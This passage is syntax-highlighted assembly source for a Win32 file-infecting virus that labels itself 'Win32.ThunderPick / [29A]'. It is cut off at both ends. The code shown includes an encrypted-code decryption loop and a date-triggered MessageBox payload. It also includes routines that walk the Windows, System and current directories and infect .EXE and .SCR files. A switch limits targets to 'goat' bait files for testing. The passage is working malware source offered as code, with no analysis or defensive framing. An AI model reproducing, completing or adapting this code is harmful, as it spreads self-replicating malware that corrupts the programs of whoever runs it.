       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">first_gen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;нlet's decrypt the orig.</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">do_it</span><span class="sc0">                   </span><span class="sc1">;нcode and the relocating</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;нcode.</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">do_it</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                       </span><span class="sc1">;нsave regs</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;нget key</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">increment</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;нget key increment</span><span class="sc0">
</span><span class="sc5">@10</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;нaddress of code</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">incrsize</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">;нsize of code</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iterations</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;нnumber of iterations</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">;нsave edi</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">decrypt_loop</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;нget dword</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;нincrement with key</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;нincrement key</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;нxor with increment</span><span class="sc0">
       </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;нrotate</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                  </span><span class="sc1">;нand store</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">;нgo to next dword</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">decrypt_loop</span><span class="sc0">               </span><span class="sc1">;нloop until end</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">;нdecrement iterations</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ready</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">incrsize</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">;нredo all...</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">decrypt_loop</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">ready</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">Payload</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@30</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc0">   </span><span class="sc5">SYSTEMTIME</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">0</span><span class="sc4">&gt;</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">@30</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetSystemTime</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">time</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ST_wDay</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nopayload</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ST_wHour</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">14d</span><span class="sc0">       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">nopayload</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@31</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Win32.ThunderPick / [29A]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">@31</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@32</span><span class="sc0">                    </span><span class="sc1">;ллллллллллллллллллллллллл</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc12">'   It''s  time  for  the  Thunder...     '</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">  </span><span class="sc1">;о</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'   It''s  time  for  the  Pick...        '</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">  </span><span class="sc1">;о</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'   And it''s  time  for  the  Rocker     '</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0"> </span><span class="sc1">;о</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'   Your  bottom  to  kick !!!        '</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc1">;о</span><span class="sc0">
</span><span class="sc5">@32</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;ллллллллллллллллллллллллл</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_MessageBoxA</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">nopayload</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">first_gen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">;нmark the first gen.</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;нGet the drive type. If</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetDriveTypeA</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;нit is a fixed drive</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crt_dir_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;нthan this value = 0</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                    </span><span class="sc1">;нGet Windows directory</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@1</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">windir</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">@1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                    </span><span class="sc1">;нGet System directory</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@2</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">sysdir</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">@2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetSystemDirectoryA</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@3</span><span class="sc0">                     </span><span class="sc1">;нGet current directory</span><span class="sc0">
</span><span class="sc5">crtdir</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">@3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crt_dir_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;нare we on a fixed disk?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">direct_to_windows</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">      </span><span class="sc1">;нinfect all files there</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect_Directory</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">direct_to_windows</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gen1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;нfirst generation?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">back_to_current_dir</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">windir</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;нChange to Windows dir.</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">;нinfect 3 files there</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect_Directory</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sysdir</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;нChange to System dir.</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">;нinfect 3 files there</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect_Directory</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">back_to_current_dir</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crtdir</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;нChange back to crt dir.</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">infections</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">crt_dir_flag</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">Infect_Directory</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crt_dir_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">;нreset this</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">re_do</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@4</span><span class="sc0">                     </span><span class="sc1">;нlocate first matching</span><span class="sc0">
       </span><span class="sc5">finddata</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">        </span><span class="sc1">;нfile.</span><span class="sc0">
</span><span class="sc5">@4</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_mask</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@5</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">GOAT</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">filemask1</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'goat*.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">ELSE</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">filemask1</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">next_mask</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@5</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">GOAT</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">filemask2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'goat*.scr'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">ELSE</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">filemask2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.SCR'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">@5</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindFirstFileA</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">findhandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">compare</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckError</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">get_next</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finddata.WFD_cFileName</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;нget name</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect_File</span><span class="sc0">                </span><span class="sc1">;нand infect it</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">no_infection</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">finished_infection</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">no_infection</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finddata</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;нlocate next matching</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">;нname.</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">findhandle</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindNextFileA</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">compare</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">get_next</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
